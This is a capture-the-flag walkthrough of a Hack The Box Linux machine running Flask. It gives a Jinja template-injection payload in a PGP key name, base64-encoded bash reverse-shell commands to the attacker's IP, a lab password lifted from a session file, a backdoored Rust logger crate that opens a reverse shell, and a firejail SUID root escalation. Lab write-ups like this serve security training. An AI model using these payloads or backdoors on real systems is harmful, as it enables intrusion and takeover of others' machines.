# Recon:

NMAP:

```
# Nmap 7.94 scan initiated Sat Oct 14 20:36:17 2023 as: nmap -sVC -p 22,443,80 -oN targeted 10.10.11.218

Nmap scan report for 10.10.11.218
Host is up (0.41s latency).
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to [https://ssa.htb/](https://ssa.htb/)
443/tcp open ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after: 2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ETC/HOSTS:

```
[https://ssa.htb/](https://ssa.htb/)
```

DIRB:

```
ADMIN
[https://ssa.htb/login?next=%2Fadmin](https://ssa.htb/login?next=%2Fadmin)
```

WHATWEB:

```
whatweb [http://10.10.11.218](http://10.10.11.218)

[http://10.10.11.218](http://10.10.11.218) [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.218], RedirectLocation[[https://ssa.htb/](https://ssa.htb/)], Title[301 Moved Permanently], nginx[1.18.0]
```

WAPPALIZER:

## [Font scripts]
[Bootstrap Icons]
## [Miscellaneous]
[Popper]
## [Web servers]
[Nginx]
## [Operating systems]
[Ubuntu]
## [JavaScript libraries]
[jQuery]
[Reverse proxies]
## [Nginx] 1.18.0
[UI frameworks]


This called my attention :

"POWERED BY FLASK"

Some conclusions of this first approach:
- This is a ubuntu machine (Watching the "launchpad" seems to be jammy) 
- Uses Nginx server
- Uses the framework Flask.



# FOOTHOLD

At the first approach I was thinking that the vulnerability of this machine resides on the cookies. But really the vulnerability resides on a SSTI. 

The site has a PGP functionality, where you can send an encrypted PGP mail using the public key of the website. But we can verify our own firmed messages and public keys, we will exploit this functionality.

First of all, I need to create my own PGP key.



With this command I start to generate it
```
kali> gpg --gen-key
```


The "name" input is the vulnerable on this case. So when I was generating the key I used:

```
Real name: {{7*7}}
Email address: test@test.com
```
There are more payloads on this website:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md


The next step is generate a public key

```
gpg --armor --export <mail> > public_key.asc
```

Now, use I `cat public_key.asc` and I copied the public key

The next step is generate a signed message

```
1-First, create a .txt file:
echo "test" > message.txt

2-Now, I generate a signed message:
gpg --clear-sign --output signed_message.asc messsage.txt
```


The next step is put two messages on the correct place, the key signature message and the public key. And then click on verify the message. If we do it right we get a "49" on the response, this means that the website is interpreting and executing code.

```
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Thu 09 Nov 2023 05:24:19 PM UTC gpg: using RSA key C424258B762F06B6F17FECE4D975605D4F6F1204 [GNUPG:] KEY_CONSIDERED C424258B762F06B6F17FECE4D975605D4F6F1204 0 [GNUPG:] SIG_ID BQqiwxy06xHlFhuEi5abH9zEtNw 2023-11-09 1699550659 [GNUPG:] KEY_CONSIDERED C424258B762F06B6F17FECE4D975605D4F6F1204 0 [GNUPG:] GOODSIG D975605D4F6F1204 49 gpg: Good signature from "49" [unknown] [GNUPG:] VALIDSIG C424258B762F06B6F17FECE4D975605D4F6F1204 2023-11-09 1699550659 0 4 0 1 10 01 C424258B762F06B6F17FECE4D975605D4F6F1204 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: C424 258B 762F 06B6 F17F ECE4 D975 605D 4F6F 1204
```

Look at the `Good signature from "49"`. We have success, now lets see if we can get a reverse shell.

Fist I will delete the keys that I made before
```
gpg --delete-secret-keys test@test.com

gpg --delete-keys test@test.com
```

I take this payload from payload all the things website and I changed the "id" for my reverse shell

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

This will give problems for the > or the & characters, so its better to encode it with base 64

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c “bash -i >& /dev/tcp/<your_ip>/9001 0>&1”').read() }}
```

Encode the payload:

```
echo "bash -c 'bash -i >& /dev/tcp/<your_ip>/9001 0>&1'" | base64

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44Ni85MDAxIDA+JjEnCg==
```

Now i repeated the process but on the "Real name" input I used this `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44Ni85MDAxIDA+JjEnCg==" | base64 -d | bash ').read() }}`


First we need to listen on netcat 

```
nc -nlvp 9001
```

So when I click "Verificate sign" I will have a reverse shell.

This was a very unstable shell, I cannot stabilize it with no one of the "tty cheat sheet tips" (google it).

# USER:

Here I was "atlas" but I can only read with this shell. 

The next step is go to the folder `/home/atlas/.config/httpie/sessions/localhost_5000` and cat a json file on this folder.


cat admin.json
```


cat admin.json
{
"__meta__": {
"about": "HTTPie session file",
"help": "[https://httpie.io/docs#sessions](https://httpie.io/docs#sessions)",
"httpie": "2.6.0"
},
"auth": {
"password": "quietLiketheWind22",
"type": null,
"username": "silentobserver"
},
"cookies": {
"session": {
"expires": null,
"path": "/",
"secure": false,
"value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
}
},
"headers": {
"Accept": "application/json, */*;q=0.5"
}

}
```
Here is the ssh password for the "silentobserver" user


Lets connect to the machine via ssh as silentobserver:
```
ssh silentobserver@10.10.11.218
```

# SilentObserver 

I searched for SUID interesting files with

```
find / -perm /4000 2>/dev/null
```

And this catch my attention:

```
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
```

On the folder  `/opt/tipnet/target/debug/`there was a (file!?) called `tipnet.d` and inside of it I was able to see two "rs" files (rust) more. And in one of them I had permissions to write 

```
cat tipnet.d

/opt/tipnet/target/debug/tipnet: /opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs
```

I edited it with nano

nano /opt/crates/logger/src/lib.rs

From this:
(when you cat it you will see it indented in a right way )
```
use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {

  let now = Local::now();
  let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
  let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n",    timestamp, user, query, justification);
  let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
  Ok(file) => file,
  Err(e) => {
    println!("Error opening log file: {}", e);
    return;
  }
};
 if let Err(e) = file.write_all(log_message.as_bytes()) {
   println!("Error writing to log file: {}", e);
  }
}
```

To this:


```
use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {

  let output = Command::new("bash")

    .arg("-c")
    .arg("bash -i >& /dev/tcp/10.10.16.86/4444 0>&1")
    .output()
    .expect("failed to execute process");

  let now = Local::now();
  let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
  let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n",
  timestamp, user, query, justification);
  let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
  Ok(file) => file,
  Err(e) => {
    println!("Error opening log file: {}", e);
    return;
  }
};
 if let Err(e) = file.write_all(log_message.as_bytes()) {
   println!("Error writing to log file: {}", e);
  }
}
```



This is a task that is executing itself in a automatic way ( you can see it with pspy). Now, when we edit this file, first we need to listen on the port 4444 and we will have a reverse shell.

Asset: https://doc.rust-lang.org/std/process/struct.Command.html
# ATLAS USER


Strangely, when I did this , I become Atlas, again, no root. But I was able to do better things on my shell, not only read.  

I create a file called "authorized_keys" on the .ssh folder. and I copy my own id_rsa.pub key inside of it, and I was able to get inside of the machine via ssh.

```
ssh -i id_rsa atlas@10.10.11.218 
```




# ROOT

Once I was inside the machine as atlas via ssh I used (again) the command to search files with SUID perm

```
find / -perm /4000 2>/dev/null

/usr/local/bin/firejail
```

This binary called my atention and the same binary was on the silent observer, but I wasnt able to exploit it.

If we see this binary called "firejail" we can exploit the SUID permission to become root.

First we need to create a exploit , I copy the code of this website and create a file called "exploit.py" and I add the permisions to execution with chmod u+x :

[https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)

This given me an output like this one :
```
You can run 'firejail --join=43597' in another terminal a shell where 'sudo su -' should grant you a root shell
```

So I just did it , I went to the machine from another ssh session and then I execute:
```
firejail --join=43597
```
And then 
```
su-
```

And finally become root.